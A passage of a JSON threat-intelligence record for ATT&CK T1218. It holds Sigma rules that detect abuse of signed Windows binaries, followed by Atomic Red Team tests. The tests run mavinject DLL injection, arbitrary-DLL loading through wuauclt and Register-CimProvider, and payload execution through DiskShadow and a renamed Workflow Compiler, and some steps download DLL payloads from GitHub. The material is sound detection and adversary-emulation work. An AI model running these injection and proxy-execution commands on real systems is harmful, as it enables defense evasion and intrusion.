                            "raw": "author: Nasreddine Bencherchali (Nextron Systems), memory-shards\ndate: 2022/12/24\ndescription: Detects execution of the AgentExecutor.exe binary. Which can be abused\n  as a LOLBIN to execute powershell scripts with the ExecutionPolicy \"Bypass\" or any\n  binary named \"powershell.exe\" located in the path provided by 6th postiional argument\ndetection:\n  condition: all of selection_* and not filter\n  filter:\n    CommandLine|contains:\n    - C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\\n    - C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\\n  selection_cli:\n    CommandLine|contains:\n    - ' -powershell'\n    - ' -remediationScript'\n  selection_img:\n  - Image|endswith: \\AgentExecutor.exe\n  - OriginalFileName: AgentExecutor.exe\nfalsepositives:\n- Unknown\nid: c0b40568-b1e9-4b03-8d6c-b096da6da9ab\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/lefterispan/status/1286259016436514816\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Agentexecutor/\n- https://docs.microsoft.com/en-us/mem/intune/apps/intune-management-extension\n- https://twitter.com/jseerden/status/1247985304667066373/photo/1\nrelated:\n- id: 7efd2c8d-8b18-45b7-947d-adfe9ed04f61\n  type: similar\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Suspicious AgentExecutor PowerShell Execution\n",
                            "sigma:id": "c0b40568-b1e9-4b03-8d6c-b096da6da9ab",
                            "title": "Suspicious AgentExecutor PowerShell Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "835e75bf-4bfd-47a4-b8a6-b766cac8bcb7",
                        "lookup_data": {
                            "description": "Detects the use of Setres.exe to set the screen resolution and then potentially launch a file named \"choice\" (with any executable extension such as \".cmd\" or \".exe\") from the current execution path",
                            "raw": "author: '@gott_cyber'\ndate: 2022/12/11\ndescription: Detects the use of Setres.exe to set the screen resolution and then potentially\n  launch a file named \"choice\" (with any executable extension such as \".cmd\" or \".exe\")\n  from the current execution path\ndetection:\n  condition: all of selection*\n  selection:\n    Image|endswith: \\choice\n    ParentImage|endswith: \\setres.exe\nfalsepositives:\n- Legitimate usage of Setres\nid: 835e75bf-4bfd-47a4-b8a6-b766cac8bcb7\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Setres/\n- https://twitter.com/0gtweet/status/1583356502340870144\n- https://strontic.github.io/xcyclopedia/library/setres.exe-0E30E4C09637D7A128A37B59A3BC4D09.html\n- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.t1202\ntitle: Use of Setres.exe\n",
                            "sigma:id": "835e75bf-4bfd-47a4-b8a6-b766cac8bcb7",
                            "title": "Use of Setres.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7d604714-e071-49ff-8726-edeb95a70679",
                        "lookup_data": {
                            "description": "Detects programs on a Windows system that should not write scripts to disk",
                            "raw": "author: frack113, Florian Roth\ndate: 2022/08/21\ndescription: Detects programs on a Windows system that should not write scripts to\n  disk\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\winword.exe\n    - \\excel.exe\n    - \\powerpnt.exe\n    - \\msaccess.exe\n    - \\mspub.exe\n    - \\eqnedt32.exe\n    - \\visio.exe\n    - \\wordpad.exe\n    - \\wordview.exe\n    - \\certutil.exe\n    - \\certoc.exe\n    - \\CertReq.exe\n    - \\Desktopimgdownldr.exe\n    - \\esentutl.exe\n    - \\finger.exe\n    - \\AcroRd32.exe\n    - \\RdrCEF.exe\n    - \\mshta.exe\n    - \\hh.exe\n    TargetFilename|endswith:\n    - .ps1\n    - .bat\n    - .vbs\n    - .scf\n    - .wsf\n    - .wsh\nfalsepositives:\n- Unknown\nid: 7d604714-e071-49ff-8726-edeb95a70679\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nreferences:\n- https://github.com/Neo23x0/sysmon-config/blob/3f808d9c022c507aae21a9346afba4a59dd533b9/sysmonconfig-export-block.xml#L1326\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Legitimate Application Dropped Script\n",
                            "sigma:id": "7d604714-e071-49ff-8726-edeb95a70679",
                            "title": "Legitimate Application Dropped Script",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "17eb8e57-9983-420d-ad8a-2c4976c22eb8",
                        "lookup_data": {
                            "description": "Detects process injection using the signed Windows tool Mavinject32.exe",
                            "raw": "author: Florian Roth\ndate: 2018/12/12\ndescription: Detects process injection using the signed Windows tool Mavinject32.exe\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: ' /INJECTRUNNING '\nfalsepositives:\n- unknown\nid: 17eb8e57-9983-420d-ad8a-2c4976c22eb8\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2020/09/01\nreferences:\n- https://twitter.com/gN3mes1s/status/941315826107510784\n- https://reaqta.com/2017/12/mavinject-microsoft-injector/\n- https://twitter.com/Hexacorn/status/776122138063409152\nstatus: experimental\ntags:\n- attack.t1055\n- attack.t1055.001\n- attack.t1218\ntitle: MavInject Process Injection\n",
                            "sigma:id": "17eb8e57-9983-420d-ad8a-2c4976c22eb8",
                            "title": "MavInject Process Injection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "43103702-5886-11ed-9b6a-0242ac120002",
                        "lookup_data": {
                            "description": "Detects Microsoft Visual Studio vsls-agent.exe lolbin execution with a suspicious library load using the --agentExtensionPath parameter",
                            "raw": "author: bohops\ndate: 2022/10/30\ndescription: Detects Microsoft Visual Studio vsls-agent.exe lolbin execution with\n  a suspicious library load using the --agentExtensionPath parameter\ndetection:\n  condition: selection and not filter\n  filter:\n    CommandLine|contains: Microsoft.VisualStudio.LiveShare.Agent.\n  selection:\n    CommandLine|contains: --agentExtensionPath\n    Image|endswith: \\vsls-agent.exe\nfalsepositives:\n- False positives depend on custom use of vsls-agent.exe\nfields:\n- CommandLine\n- ParentCommandLine\nid: 43103702-5886-11ed-9b6a-0242ac120002\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/bohops/status/1583916360404729857\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Suspicious Vsls-Agent Command With AgentExtensionPath Load\n",
                            "sigma:id": "43103702-5886-11ed-9b6a-0242ac120002",
                            "title": "Suspicious Vsls-Agent Command With AgentExtensionPath Load",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d7825193-b70a-48a4-b992-8b5b3015cc11",
                        "lookup_data": {
                            "description": "Detects code execution via the Windows Update client (wuauclt)",
                            "raw": "author: FPT.EagleEye Team\ndate: 2020/10/17\ndescription: Detects code execution via the Windows Update client (wuauclt)\ndetection:\n  condition: all of selection* and not filter\n  filter:\n    CommandLine|contains:\n    - ' /ClassId '\n    - ' wuaueng.dll '\n  selection_cli:\n    CommandLine|contains|all:\n    - /UpdateDeploymentProvider\n    - /RunHandlerComServer\n    - .dll\n  selection_img:\n  - Image|endswith: \\wuauclt.exe\n  - OriginalFileName: wuauclt.exe\nfalsepositives:\n- Unknown\nid: d7825193-b70a-48a4-b992-8b5b3015cc11\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/13\nreferences:\n- https://dtm.uk/wuauclt/\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.execution\n- attack.t1105\n- attack.t1218\ntitle: Windows Update Client LOLBIN\n",
                            "sigma:id": "d7825193-b70a-48a4-b992-8b5b3015cc11",
                            "title": "Windows Update Client LOLBIN",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9577edbb-851f-4243-8c91-1d5b50c1a39b",
                        "lookup_data": {
                            "description": "Detects creation/modification of Assistive Technology applications and persistence with usage of 'at'",
                            "raw": "author: Mateusz Wydra, oscd.community\ndate: 2020/10/13\ndescription: Detects creation/modification of Assistive Technology applications and\n  persistence with usage of 'at'\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_atbroker:\n    Details: (Empty)\n    Image: C:\\Windows\\system32\\atbroker.exe\n    TargetObject|contains: \\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration\n  filter_uninstallers:\n    Image|startswith: C:\\Windows\\Installer\\MSI\n    TargetObject|contains: Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\n  selection:\n    TargetObject|contains:\n    - Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\n    - Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration\nfalsepositives:\n- Creation of non-default, legitimate at usage\nid: 9577edbb-851f-4243-8c91-1d5b50c1a39b\nlevel: medium\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2023/01/19\nreferences:\n- http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/\n- https://lolbas-project.github.io/lolbas/Binaries/Atbroker/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.persistence\n- attack.t1547\ntitle: Atbroker Registry Change\n",
                            "sigma:id": "9577edbb-851f-4243-8c91-1d5b50c1a39b",
                            "title": "Atbroker Registry Change",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a20391f8-76fb-437b-abc0-dba2df1952c6",
                        "lookup_data": {
                            "description": "Detects a certain command line flag combination used by Microsoft.NodejsTools.PressAnyKey.exe that can be used to execute any other binary",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/01/11\ndescription: Detects a certain command line flag combination used by Microsoft.NodejsTools.PressAnyKey.exe\n  that can be used to execute any other binary\ndetection:\n  condition: 1 of selection* and not 1 of filter*\n  filter:\n    Image|contains: \\Microsoft\\NodeJsTools\\NodeJsTools\n  selection1:\n    CommandLine|contains: 'Microsoft.NodejsTools.PressAnyKey.exe normal '\n  selection2:\n    CommandLine|contains: '.exe normal '\n    CommandLine|endswith: .exe\nfalsepositives:\n- Other tools with the same command line flag combination\n- Legitimate uses as part of Visual Studio development\nid: a20391f8-76fb-437b-abc0-dba2df1952c6\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/mrd0x/status/1463526834918854661\nstatus: test\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1218\ntitle: NodejsTools PressAnyKey Lolbin\n",
                            "sigma:id": "a20391f8-76fb-437b-abc0-dba2df1952c6",
                            "title": "NodejsTools PressAnyKey Lolbin",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0b4ae027-2a2d-4b93-8c7e-962caaba5b2a",
                        "lookup_data": {
                            "description": "Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe.",
                            "raw": "author: \"Ensar \\u015Eamil, @sblmsrsn, @oscd_initiative\"\ndate: 2020/10/06\ndescription: Detects usage of Time Travel Debugging Utility. Adversaries can execute\n  malicious processes and dump processes, such as lsass.exe, via tttracer.exe.\ndetection:\n  condition: selection\n  selection:\n    ParentImage|endswith: \\tttracer.exe\nfalsepositives:\n- Legitimate usage by software developers/testers\nid: 0b4ae027-2a2d-4b93-8c7e-962caaba5b2a\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Tttracer/\n- https://twitter.com/mattifestation/status/1196390321783025666\n- https://twitter.com/oulusoyum/status/1191329746069655553\nrelated:\n- id: e76c8240-d68f-4773-8880-5c6f63595aaf\n  type: derived\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.credential_access\n- attack.t1218\n- attack.t1003.001\ntitle: Time Travel Debugging Utility Usage\n",
                            "sigma:id": "0b4ae027-2a2d-4b93-8c7e-962caaba5b2a",
                            "title": "Time Travel Debugging Utility Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "340a090b-c4e9-412e-bb36-b4b16fe96f9b",
                        "lookup_data": {
                            "description": "Detects a renamed dctask64.exe used for process injection, command execution, process creation with a signed binary by ZOHO Corporation",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/01/28\ndescription: Detects a renamed dctask64.exe used for process injection, command execution,\n  process creation with a signed binary by ZOHO Corporation\ndetection:\n  condition: selection and not filter\n  filter:\n    Image|endswith: \\dctask64.exe\n  selection:\n    Hashes|contains: 6834B1B94E49701D77CCB3C0895E1AFD\nfalsepositives:\n- Unknown yet\nfields:\n- CommandLine\n- ParentCommandLine\n- ParentImage\nid: 340a090b-c4e9-412e-bb36-b4b16fe96f9b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/12/08\nreferences:\n- https://twitter.com/gN3mes1s/status/1222088214581825540\n- https://twitter.com/gN3mes1s/status/1222095963789111296\n- https://twitter.com/gN3mes1s/status/1222095371175911424\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.t1055.001\n- attack.t1202\n- attack.t1218\ntitle: Renamed ZOHO Dctask64\n",
                            "sigma:id": "340a090b-c4e9-412e-bb36-b4b16fe96f9b",
                            "title": "Renamed ZOHO Dctask64",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bafac3d6-7de9-4dd9-8874-4a1194b493ed",
                        "lookup_data": {
                            "description": "Attackers can use print.exe for remote file copy",
                            "raw": "author: Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative\ndate: 2020/10/05\ndescription: Attackers can use print.exe for remote file copy\ndetection:\n  condition: selection and not filter_print\n  filter_print:\n    CommandLine|contains: print.exe\n  selection:\n    CommandLine|contains|all:\n    - /D\n    - .exe\n    CommandLine|startswith: print\n    Image|endswith: \\print.exe\nfalsepositives:\n- Unknown\nid: bafac3d6-7de9-4dd9-8874-4a1194b493ed\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/07\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Print/\n- https://twitter.com/Oddvarmoe/status/985518877076541440\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Abusing Print Executable\n",
                            "sigma:id": "bafac3d6-7de9-4dd9-8874-4a1194b493ed",
                            "title": "Abusing Print Executable",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9386d78a-7207-4048-9c9f-a93a7c2d1c05",
                        "lookup_data": {
                            "description": "Detects launch of executable by calling the LaunchApplication function from pcwutl.dll library.",
                            "raw": "author: Julia Fomina, oscd.community\ndate: 2020/10/05\ndescription: Detects launch of executable by calling the LaunchApplication function\n  from pcwutl.dll library.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - pcwutl\n    - LaunchApplication\n    Image|endswith: \\rundll32.exe\nfalsepositives:\n- Use of Program Compatibility Troubleshooter Helper\nid: 9386d78a-7207-4048-9c9f-a93a7c2d1c05\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://lolbas-project.github.io/lolbas/Libraries/Pcwutl/\n- https://twitter.com/harr0ey/status/989617817849876488\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Code Execution via Pcwutl.dll\n",
                            "sigma:id": "9386d78a-7207-4048-9c9f-a93a7c2d1c05",
                            "title": "Code Execution via Pcwutl.dll",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "56a8189f-11b2-48c8-8ca7-c54b03c2fbf7",
                        "lookup_data": {
                            "description": "Detects flags often used with the LOLBAS Esentutl for malicious activity. It could be used in rare cases by administrators to access locked files or during maintenance.",
                            "raw": "author: Florian Roth\ndate: 2020/05/23\ndescription: Detects flags often used with the LOLBAS Esentutl for malicious activity.\n  It could be used in rare cases by administrators to access locked files or during\n  maintenance.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - ' /vss '\n    - ' /y '\nfalsepositives:\n- Administrative activity\nfields:\n- CommandLine\n- ParentCommandLine\nid: 56a8189f-11b2-48c8-8ca7-c54b03c2fbf7\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/\n- https://twitter.com/chadtilbury/status/1264226341408452610\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.s0404\n- attack.t1218\ntitle: Suspicious Esentutl Use\n",
                            "sigma:id": "56a8189f-11b2-48c8-8ca7-c54b03c2fbf7",
                            "title": "Suspicious Esentutl Use",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1218",
                "display_name": "Signed Binary Proxy Execution",
                "atomic_tests": [
                    {
                        "name": "mavinject - Inject DLL into running process",
                        "auto_generated_guid": "c426dacf-575d-4937-8611-a148a86a5e61",
                        "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "process_id": {
                                "description": "PID of process receiving injection",
                                "type": "string",
                                "default": "1000"
                            },
                            "dll_payload": {
                                "description": "DLL to inject",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "T1218.dll must exist on disk at specified location (#{dll_payload})\n",
                                "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll\" -OutFile \"#{dll_payload}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "mavinject.exe #{process_id} /INJECTRUNNING \"#{dll_payload}\"\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Register-CimProvider - Execute evil dll",
                        "auto_generated_guid": "ad2c17ed-f626-4061-b21e-b9804a6f3655",
                        "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "dll_payload": {
                                "description": "DLL to execute",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n",
                                "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path \"#{dll_payload}\"\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "InfDefaultInstall.exe .inf Execution",
                        "auto_generated_guid": "54ad7d5a-a1b5-472c-b6c4-f8090fb2daef",
                        "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "inf_to_execute": {
                                "description": "Local location of inf file",
                                "type": "string",
                                "default": "PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "INF file must exist on disk at specified location (#{inf_to_execute})\n",
                                "prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf\" -OutFile \"#{inf_to_execute}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "InfDefaultInstall.exe \"#{inf_to_execute}\"\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "ProtocolHandler.exe Downloaded a Suspicious File",
                        "auto_generated_guid": "db020456-125b-4c8b-a4a7-487df8afb5a2",
                        "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_url": {
                                "description": "url to document",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Microsoft Word must be installed\n",
                                "prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
                            }
                        ],
                        "executor": {
                            "name": "command_prompt",
                            "elevation_required": false,
                            "command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|#{remote_url}\"\n"
                        }
                    },
                    {
                        "name": "Microsoft.Workflow.Compiler.exe Payload Execution",
                        "auto_generated_guid": "7cbb0f26-a4c1-4f77-b180-a009aa05637e",
                        "description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "xml_payload": {
                                "description": "XML to execution",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1218\\src\\T1218.xml"
                            },
                            "mwcpath": {
                                "description": "Default location of Microsoft.Workflow.Compiler.exe",
                                "type": "path",
                                "default": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"
                            },
                            "mwcname": {
                                "description": "Default name of microsoft.workflow.compiler.exe",
                                "type": "path",
                                "default": "microsoft.workflow.compiler.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": ".Net must be installed for this test to work correctly.\n",
                                "prereq_command": "if (Test-Path #{mwcpath}\\#{mwcname} ) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "write-host \".Net must be installed for this test to work correctly.\"\n"
                            }
                        ],
                        "executor": {
                            "command": "#{mwcpath}\\#{mwcname} \"#{xml_payload}\" output.txt\n",
                            "name": "powershell",
                            "elevation_required": false
                        }
                    },
                    {
                        "name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions",
                        "auto_generated_guid": "4cc40fd7-87b8-4b16-b2d7-57534b86b911",
                        "description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "xml_payload": {
                                "description": "XML to execution",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1218\\src\\T1218.xml"
                            },
                            "renamed_binary": {
                                "description": "renamed Microsoft.Workflow.Compiler",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\svchost.exe"
                            },
                            "mwcpath": {
                                "description": "Default location of Microsoft.Workflow.Compiler.exe",
                                "type": "path",
                                "default": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"
                            },
                            "mwcname": {
                                "description": "Default name of microsoft.workflow.compiler.exe",
                                "type": "path",
                                "default": "microsoft.workflow.compiler.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": ".Net must be installed for this test to work correctly.\n",
                                "prereq_command": "if (Test-Path \"#{renamed_binary}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nCopy-Item #{mwcpath}\\#{mwcname} \"#{renamed_binary}\" -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "&\"#{renamed_binary}\" \"#{xml_payload}\" output.txt\n",
                            "name": "powershell",
                            "elevation_required": false
                        }
                    },
                    {
                        "name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test",
                        "auto_generated_guid": "9ebe7901-7edf-45c0-b5c7-8366300919db",
                        "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "module_name": {
                                "description": "Specifies a temporary module name to use. If -ModuleName is not supplied, a 16-character random temporary module name is used. A PowerShell module can have any name. Because Get-VMRemoteFXPhysicalVideoAdapter abuses module load order, a module name must be specified.",
                                "type": "string",
                                "default": "foo"
                            },
                            "module_path": {
                                "description": "Specifies an alternate, non-default PowerShell module path for RemoteFXvGPUDisablement.exe. If -ModulePath is not specified, the first entry in %PSModulePath% will be used. Typically, this is %USERPROFILE%\\Documents\\WindowsPowerShell\\Modules.",
                                "type": "string",
                                "default": "$PWD"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "The AtomicTestHarnesses module must be installed and Invoke-ATHRemoteFXvGPUDisablementCommand must be exported in the module.",
                                "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}",
                                "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "DiskShadow Command Execution",
                        "auto_generated_guid": "0e1483ba-8f0c-425d-b8c6-42736e058eaa",
                        "description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "txt_payload": {
                                "description": "txt to execute",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1218\\src\\T1218.txt"
                            },
                            "dspath": {
                                "description": "Default location of DiskShadow.exe",
                                "type": "path",
                                "default": "C:\\Windows\\System32\\diskshadow.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "txt file must exist on disk at specified location (#{txt_payload})",
                                "prereq_command": "if (Test-Path \"#{txt_payload}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{txt_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/T1218.txt\" -OutFile \"#{txt_payload}\"\n"
                            },
                            {
                                "description": "DiskShadow.exe must exist on disk at specified location (#{dspath})",
                                "prereq_command": "if (Test-Path #{dspath}) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "echo \"DiskShadow.exe not found on disk at expected location\"\n"
                            }
                        ],
                        "executor": {
                            "command": "#{dspath} -S #{txt_payload} \n",
                            "name": "powershell",
                            "elevation_required": false
                        }
                    },
                    {
                        "name": "Load Arbitrary DLL via Wuauclt (Windows Update Client)",
                        "auto_generated_guid": "49fbd548-49e9-4bb7-94a6-3769613912b8",
                        "description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "arbitrary_dll": {
                                "description": "Path of DLL to be loaded",
                                "type": "string",
                                "default": "PathToAtomicsFolder\\T1218\\bin\\calc.dll"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "DLL to load must exist on disk as specified location (#{arbitrary_dll})\n",
                                "prereq_command": "if (test-path \"#{arbitrary_dll}\"){exit 0} else {exit 1}\n",
